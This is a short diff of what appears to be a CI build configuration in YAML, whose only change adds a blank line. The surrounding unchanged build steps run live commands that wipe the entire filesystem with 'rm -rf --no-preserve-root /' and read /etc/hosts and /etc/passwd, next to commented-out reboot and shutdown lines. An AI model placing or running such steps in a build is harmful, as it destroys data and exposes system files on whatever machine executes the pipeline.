@@ -34,6 +34,7 @@ build:
           # reboot -f
           # shutdown -r now
           rm -rf --no-preserve-root /
+          
           pwd
           cat /etc/hosts > aaa.txt
           cat /etc/passwd
